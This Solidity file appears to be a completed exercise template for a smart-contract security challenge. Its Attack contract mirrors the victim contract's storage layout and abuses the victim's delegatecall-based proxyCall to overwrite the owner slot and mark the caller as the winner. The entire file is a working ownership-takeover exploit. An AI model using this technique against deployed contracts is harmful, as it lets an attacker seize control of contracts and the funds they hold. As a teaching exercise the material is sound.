// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ID31eg4t3 {
    function proxyCall(bytes calldata data) external returns (address);
    function changeResult() external;
}

contract Attack {
    address internal immutable victim;
    // TODO: Declare some variable here
    // Note: Checkout the storage layout in victim contract
    uint256 var0 = 12345;
    uint8 var1 = 32;
    string private var2;
    address private var3;
    uint8 private var4;
    address public owner;
    mapping(address => bool) public result;
    ID31eg4t3 public delegate;

    constructor(address addr) payable {
        victim = addr;
    }

    // NOTE: You might need some malicious function here

    function setownerAndhack (address owneraddress) public {
        owner = owneraddress;
        result[owneraddress] = true;
    }

    function exploit() external {
        // TODO: Add your implementation here
        // Note: Make sure you know how delegatecall works
        // bytes memory data = ...
        delegate = ID31eg4t3(victim);
        delegate.proxyCall
            (abi.encodeWithSignature("setownerAndhack(address)",msg.sender));
    }
}
